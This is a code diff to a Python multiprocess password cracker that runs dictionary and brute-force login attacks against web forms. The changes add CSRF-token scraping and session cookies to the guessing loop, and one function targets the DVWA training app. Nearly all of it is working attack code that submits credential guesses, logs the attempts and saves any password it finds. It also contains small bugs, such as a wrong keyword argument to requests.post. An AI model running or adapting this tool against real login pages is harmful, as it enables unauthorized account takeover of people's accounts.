@@ -129,7 +129,7 @@ class Thuan_01():
         if os.path.exists("temp_directory"):
             shutil.rmtree("temp_directory")
 
-    def search_for_pass(self, passwords_list, username, link, data, fail, max_words):  # for dictionary and brute force
+    def search_for_pass(self, passwords_list, username, link, token, data, cookie, fail, max_words):  # for dictionary and brute force
         try:
             # temp_file = self.create_temporary_copy(compress_file, passwords_list[1])
             for word in passwords_list:
@@ -139,24 +139,33 @@ class Thuan_01():
                 data0 = data.replace("^USER^", u)
                 data00 = data0.replace("^PASS^", p)
                 data1 = json.loads(data00)
-                # data1 = {"chkSubmit": "ok", "txtLoginId": username, "txtPassword": password, "txtSel": 1}
-                r = requests.post(link, data=data1)
+                cookie1 = json.loads(cookie)
+
+                if len(token) > 1:
+                    rq = requests.get(link, cookies=cookie1)
+                    content = rq.text
+                    tk = content.find(token)
+                    tk_value = content[(tk + len(token) + 9):(tk + len(token) + 9 + 32)]
+                    # value='32-chars'
+                    t = '"' + tk_value + '"'
+                    data000 = data00.replace("^TOKEN^", t)
+                    data11 = json.loads(data000)
+                    r = requests.post(link, data=data11, cookie=cookie1)
+                else:
+                    r = requests.post(link, data=data1, cookie=cookie1)
                 stop = self.stop.get()
                 self.stop.put(stop)
-                if stop is False:  # if find password dont doing more is false
+                if stop is False:  # if we find password not doing more is false
                     self.counter(max_words)
                     if fail in r.text:
                         with open("tries.txt", "a") as f:
                             f.write(f"{password}\n")
                             f.close()
-                        # print(f"Incorrect password {passwd}\n")
                     else:
                         self.stop.get()
                         self.stop.put(True)
                         time.sleep(3)
                         print("\n\t" + self.green("[+] Password Found: " + password + '\n'))
-                        # correctpwd = True
-                        # print(f"Correct password {passwd}!\n")
                         with open("correct_pass.txt", "w") as f:
                             f.write(password)
                         break
@@ -180,12 +189,10 @@ class Thuan_01():
 
     def search_for_pass_dvwa(self, passwords_list, username, link, token, data, cookie, fail, max_words):
         try:
-            # temp_file = self.create_temporary_copy(compress_file, passwords_list[1])
             for word in passwords_list:
                 password = word.strip('\r').strip('\n')
                 data0 = link.replace("^USER^", username)
                 data00 = data0.replace("^PASS^", password)
-                # data1 = link + data00
                 cookie1 = json.loads(cookie)
                 # data1 = {"chkSubmit": "ok", "txtLoginId": username, "txtPassword": password, "txtSel": 1}
                 if len(token) > 1:
@@ -196,48 +203,27 @@ class Thuan_01():
                     data11 = data00.replace("#", tk_value)
                     # value='32-chars'
                     r = requests.get(data11, cookies=cookie1)
-                    stop = self.stop.get()
-                    self.stop.put(stop)
-                    if stop is False:  # if find password dont doing more is false
-                        self.counter(max_words)
-                        if fail in r.text:
-                            with open("tries.txt", "a") as f:
-                                f.write(f"{password}\n")
-                                f.close()
-                            # print(f"Incorrect password {passwd}\n")
-                        else:
-                            self.stop.get()
-                            self.stop.put(True)
-                            time.sleep(3)
-                            print("\n\t" + self.green("[+] Password Found: " + password + '\n'))
-                            with open("correct_pass.txt", "w") as f:
-                                f.write(password)
-                            break
-
-                    else:
-                        break
                 else:
                     r = requests.get(data00, cookies=cookie1)
-                    stop = self.stop.get()
-                    self.stop.put(stop)
-                    if stop is False:  # if find password dont doing more is false
-                        self.counter(max_words)
-                        if fail in r.text:
-                            with open("tries.txt", "a") as f:
-                                f.write(f"{password}\n")
-                                f.close()
-                            # print(f"Incorrect password {passwd}\n")
-                        else:
-                            self.stop.get()
-                            self.stop.put(True)
-                            time.sleep(3)
-                            print("\n\t" + self.green("[+] Password Found: " + password + '\n'))
-                            with open("correct_pass.txt", "w") as f:
-                                f.write(password)
-                            break
-
+                stop = self.stop.get()
+                self.stop.put(stop)
+                if stop is False:  # if we find password not doing more is false
+                    self.counter(max_words)
+                    if fail in r.text:
+                        with open("tries.txt", "a") as f:
+                            f.write(f"{password}\n")
+                            f.close()
                     else:
+                        self.stop.get()
+                        self.stop.put(True)
+                        time.sleep(3)
+                        print("\n\t" + self.green("[+] Password Found: " + password + '\n'))
+                        with open("correct_pass.txt", "w") as f:
+                            f.write(password)
                         break
+
+                else:
+                    break
             if str(self.last_process_number) in str(current_process().name):
                 time.sleep(20)
                 stop = self.stop.get()
@@ -249,23 +235,8 @@ class Thuan_01():
             self.process_lock.release()
         except KeyboardInterrupt:
             self.process_lock.release()
-        
-    def last_words_check(self, max_words, passwords_list, username, link, data, fail):
-        while True:
-            if self.stop is True:
-                exit(0)
-            elif self.count == len(passwords_list):  # self_cont kam mishe
-                if self.file_type is "rar":
-                    self.search_for_pass(passwords_list, username, link, data, fail, max_words)
-                if self.stop is False:
-                    print("\n\t" + self.red("[-] Password not found") + "\n")
-                    self.delete_temporary_directory()
-                    self.end_time()
-                return
-            else:
-                pass
 
-    def dict_guess_password(self, dict_file, username, link, data, fail):
+    def dict_guess_password(self, dict_file, username, link, token, data, cookie, fail):
         last_check = 0
         passwords_group = []
         possible_words = self.count_word(dict_file)
@@ -288,7 +259,7 @@ class Thuan_01():
                     self.stop.put(stop)
                     if stop is False:  # ok finishing all process after finding password
                         t = Process(target=self.search_for_pass,
-                                    args=(passwords, username, link, data, fail, possible_words))
+                                    args=(passwords, username, link, token, data, cookie, fail, possible_words))
                         self.threads.append(t)
                         self.process_count += 1
                         t.start()
@@ -337,7 +308,7 @@ class Thuan_01():
             self.delete_temporary_directory()
             self.end_time()
 
-    def bruteforce_guess_password(self, chars, min, max, username, link, data, fail):
+    def bruteforce_guess_password(self, chars, min, max, username, link, token, data, cookie, fail):
         last_check = 0
         passwords_group = []
         possible_com = self.count_possible_com(chars, int(min), int(max))
@@ -360,7 +331,7 @@ class Thuan_01():
                     self.stop.put(stop)
                     if stop is False:  # ok finishing all process after finding password
                         t = Process(target=self.search_for_pass,
-                                    args=(passwords, username, link, data, fail, possible_com))
+                                    args=(passwords, username, link, token, data, cookie, fail, possible_com))
                         self.threads.append(t)
                         self.process_count += 1
                         t.start()
@@ -459,7 +430,8 @@ class Thuan_01():
                     if os.path.isfile(options.dictfile):
                         dictfile = os.path.abspath(options.dictfile)
                         print(self.blue("Start time ==> ") + self.white(start_time_show) + "\n")
-                        self.dict_guess_password(dictfile, options.username, options.link, options.data, options.fail)
+                        self.dict_guess_password(dictfile, options.username, options.link, options.token, options.data,
+                                                 options.cookie, options.fail)
                     else:
                         parser.error(" " + options.dictfile + " dictionary file does not exist")
                         exit(0)
@@ -480,7 +452,8 @@ class Thuan_01():
                     else:
                         print(self.blue("Start time ==> ") + self.white(start_time_show) + "\n")
                         self.bruteforce_guess_password(chars, options.minlength, options.maxlength, options.username,
-                                                       options.link, options.data, options.fail)
+                                                       options.link, options.token, options.data, options.cookie,
+                                                       options.fail)
 
                 else:
                     parser.error(" Choose a wordlist or bruteforce method, Use --help for more info")
